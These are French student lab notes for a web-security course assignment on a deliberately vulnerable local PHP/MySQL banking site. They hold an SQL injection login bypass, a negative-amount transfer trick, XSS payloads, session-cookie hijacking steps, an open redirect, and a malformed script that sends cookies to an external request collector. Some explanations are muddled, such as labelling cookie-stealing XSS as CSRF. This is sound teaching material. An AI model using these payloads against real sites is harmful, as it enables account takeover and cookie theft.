Plus détailes sont dans google drive

https://docs.google.com/document/d/1xIKQtJTj-V5L2daSOMO8932G7JRYXA7ydgnnfOYud0s/edit#



### A.Préparation de l’environnement de travail

#### 1. PHP/MySQL

   * [x] Installez sur votre poste les outils nécessaires pour développer en PHP et travailler avec une base de données MySQL. Vous disposez en particulier de la plate-forme suivante : **WAMP** (pour windows) / **LAMP** (linux) / **MAMP** (mac)

     ```bash
     sudo apt install apache2 php libapache2-mod-php mysql-server php-mysql
     
     ```

   * [x] Vérifiez que vous avez activé l’extension **mysqli** dans PHP, et repérez le port utilisé par votre base de données MySQL

     ```bash
     #check if mysqli is enabled
     php -m | grep mysql
     
     #mysql port par default : 3306
     netstat -napt
     ```

   * [x]  Démarrez votre serveur Apache/Mysql/Php et rendez-vous sur la page d’accueil de celui-ci pour vérifier qu’il est opérationnel : http://localhost/

  La page d’accueil du serveur permet, entre autres, de voir la liste des extensions chargées. Repérez également le répertoire de déploiement des sites de votre serveur (ex : « www » dans le répertoire d’installation de wamp)

#### 2. Base de données

* [x] Rendez-vous sur l’interface de gestion de vos bases de données phpMyAdmin, par défaut à l’adresse : http://localhost/phpmyadmin/ (reportez-vous à la documentation pour connaître les identifiants d’administration par défaut)

  ```bash
  sudo apt-get install phpmyadmin php-mbstring php-gettext
  ```

  https://askubuntu.com/questions/668734/the-requested-url-phpmyadmin-was-not-found-on-this-server

* [x] Créez une base nommée **sr03**

  ```sql
  mysql -u root -p
  CREATE DATABASE sr03;
  GRANT ALL PRIVILEGES ON sr03.* TO jiawen IDENTIFIED BY '120907';
  flush privileges;
  ```

* [x] Ajoutez la table USERS qui contient les champs: 

  ```sql
  CREATE TABLE USERS (
    id_user int(11) AUTO_INCREMENT PRIMARY KEY,
    login varchar(10),
    mot_de_passe varchar(512),
    nom varchar(50),
    prenom varchar(50),
    numero_compte varchar(20),
    profil_user varchar(5) CHECK (profil_user IN (‘ADMIN’, ’USER’)) ,
    solde_compte int(11)
   );
   
  INSERT INTO USERS (id_user, login, mot_de_passe, nom, prenom, numero_compte, profil_user, solde_compte) VALUES (1, 'jiawen', '120907', 'lyu', 'jiawen', '1000', 'ADMIN', 1000);
  ```

  *(Insérez deux ou trois utilisateurs dans votre table USERS)*

* [ ]  Ajoutez la table MESSAGES qui contient les champs: id_msg : int(11) AUTO_INCREMENT

  id_user_to : int(11) id_user_from : int(11) sujet_msg : varchar(100) corps_msg : varchar(500)

#### 3. Pages PHP

* [x]  Récupérez depuis Moodle l’archive : sr03.zip

* [x]  Décompressez le contenu de cette archive dans un répertoire « sr03p20 » que vous aurez créé dans le répertoire de déploiement de PHP

* [x]  Vérifiez que vous arrivez bien sur la page d’authentification en allant à l’adresse : http://localhost/sr03p20

### B. Tests de vulnérabilité

Dans la première partie du cours, nous avons exposé une liste (non exhaustive) de failles courantes sur les applications WEB : injection, XSS, violation de contrôle d’accès, etc...

Les exercices qui suivent ont pour but de comprendre les mécanismes de plusieurs de ces failles en tester la vulnérabilité du site que nous venons de mettre en place.

#### 1. Injection SQL

   * [ ] Etudiez les différentes requêtes SQL utilisées dans l’application et donnez celles qui sont vulnérables à l’injection SQL

   * [ ] Donnez une façon d’exploiter chaque faille trouvée

     **- Authentification**

     ```php
     req =  "select nom,prenom,login,id_user,numero_compte,profil_user,solde_compte from users where login='$login' and mot_de_passe='$pwd'";
     ```

     **Code malicieux :**  `q’ or ‘q’=‘q`

     ```sql
     select nom,prenom,login,id_user,numero_compte,profil_user,solde_compte 
       from users 
       where login='$login' and mot_de_passe='$pwd'";
       où : $login = linhng
       $pwd = q’ or ‘q’=‘q’;
     ```

     **Solution :** pwd : sans espace et ni symbole  
     **- Transfert**  

     ```php
     $req = "update users set solde_compte = solde_compte + $mt where numero_compte='$dest'";
     $req = "update users set solde_compte = solde_compte - $mt where numero_compte='$src'";
     ```

     **Code malicieux :**  $mt négative 

#### 2. Cross-site scripting (XSS)

   * [ ] Proposez un moyen par lequel réaliser une attaque XSS sur le site

     Envoyer un message avec le contenu : `<script>alert("coucou")</script>`

   * [ ] A quoi pourrait servir une attaque XSS pour un pirate. Donnez des exemples de code d’attaque le cas échéant

     Un pirate peut stocker du code actif sur le serveur. Aux moments où le client demande une ressource au niveau de serveur. Et puis le client va exécuter du code malveillant à son insu pour voler de l'info notamment au travers des cookies. Les cookies sont souvent la cible d'une attaque xss.Example:

   * [ ]  Dans le cas où votre navigateur bloque le XSS, cela signifie-t-il que le site est protégé du XSS ?

#### 3. Violation de contrôle d’accès

   Citez les faiblesses que comporte, selon vous, cette application au niveau :

   - \-  du système d’authentification par login et mot de passe

     http://localhost:8888/sr03p20/vw_moncompte.php

     Après avoir effacé les cookies de votre navigateur, vous pouvez accéder directement à cette URL, vous pouvez vous connecter en tant qu'utilisateur anonyme et vous pouvez transférer de l'argent sur votre compte existant.

     ![Imgur](https://i.imgur.com/4yEOrrU.png)

   - \-  du système de contrôle d’accès

     Je peux accéder directement à l'interface d'administration en modifiant l'URL, même si l'utilisateur n'est pas administrateur.

     http://localhost:8888/sr03p20/vw_moncompte.php/admin

     <img src="https://i.imgur.com/XUZYfHU.png" alt="Imgur" style="zoom:50%;" />

   - \-  des références directes

#### 4. **Violation de gestion de session**

   * [x]  Connectez-vous au site sur un navigateur avec un utilisateur X, puis tentez d’accéder à la session en cours de cet utilisateur X depuis un autre navigateur, sans avoir recours au login et mot de passe.

   * [x] Décrivez les étapes par lesquelles vous êtes passé pour arriver à ce résultat.

      1. Besoin de garder deux comptes en ligne en même temps

      2. Utiliser la fenêtre de navigateur privé

      3. Copiez l'ID de session dans le cookie de l'utilisateur A, puis utilisez l’inspecte de Chrome pour modifier le cookie sur la page d'accueil de l'utilisateur B, puis mettez-le à jour.

         <img src="https://i.imgur.com/h6DUjEp.png" alt="Imgur" style="zoom: 50%;" />

   * [ ]  Observez ce qui se passe si des actions sont réalisées dans les deux navigateurs en parallèle. Qu’en déduisez-vous ?

      ça veut dire quoi?

#### 5. **Falsification de requête (CSRF)**

   * [x] Donnez une fonctionnalité du site susceptible d’être la cible d’une attaque CSRF

     Les victimes peuvent être des administrateurs de site web.Le pirate peut voler le mot de passe de l’admin en envoyant du code malveillant dans la formulaire de message. Une fois que l'administrateur se connecte pour regarder le message, son cookie va être automatiquement transféré vers le pirate.

   * [x] Proposez un moyen par lequel réaliser une telle attaque

     http://requestbin.net/ —— un site web pour récupérer la réponse lorsque l'admin se connecte.

     ```javascript
     <script>document.write("<img src=url.concat(document.cookie).concat("/>"))</script>
     ```

#### 6. **Vulnérabilité d'un composant**

   Notre site présente-t-il des vulnérabilités particulières au niveau de ses composants (serveur web, SGBD, etc....) ?

Il doit utiliser quelque outils qui permet d'analyser

phpmyadmin en production est fortement déconseillé, car c'est un outils trop puissant qui peux vite mal tourner s'il tombe entre de mauvaise main.

#### 7. **Chiffrement des données sensibles**

   Quelles sont les vulnérabilités de notre site en relation avec le chiffrement des données sensibles ?

#### 8. **Accès aux répertoires par http**

   Donnez un exemple de problème que peut causer la possibilité d’accès aux répertoires par http dans le cas de notre exemple sr03p20.

​	Le propriétaire du dossier n'est pas www-data

![Imgur](https://i.imgur.com/3P8OLmW.png)

#### 9. **Scripts de redirection**

   1. Inspectez le code de notre site pour repérer les éventuelles instructions de redirection non contrôlées.

      dans le fichier `myController.php` ligne 36

      ```php
      else if ($_REQUEST['action'] == 'disconnect') {
        /* ======== DISCONNECT ======== */
        unset($_SESSION["connected_user"]);
        $url_redirect = $_REQUEST['loginPage'] ;
      }
      ```

      Il y a un param `loginPage` qui peut être utilisé par le pirate pour rediriger vers un site malveillant.

   2. Donnez une façon d’exploiter l’une de ces redirections non contrôlées.











### C. Simulation d’un scénario d’attaque

Présenter un exemple de scénario d'attaque complet d’usurpation de session d’un utilisateur sur le site sr03p20.
On suppose que l’attaquant n’a pas accès à l’ordinateur de sa victime.
Vous pourrez pour cet exercice : présenter un site pirate, générer des mails frauduleux, etc...
### D. Changement d’environnement technique
Cette partie est facultative, un peu longue, mais présente tout de même un intérêt ! Pour les plus rapides d’entre vous, il est recommandé de la réaliser.
1. Développez une copie conforme du site PHP « sr03p20 » en Java (Servlet/JSP) ; vous avez le libre choix pour le serveur Java et la base de données. Le plus important est de reproduire exactement le même fonctionnement que la version PHP
2. Rejouer vos tests de vulnérabilité vus en partie B sur votre site Java
3. A l’issue de vos tests, diriez-vous que l’environnement technique (langage, serveur, base de données) a un rôle prépondérant sur la sécurisation de votre application web ? Justifiez brièvement.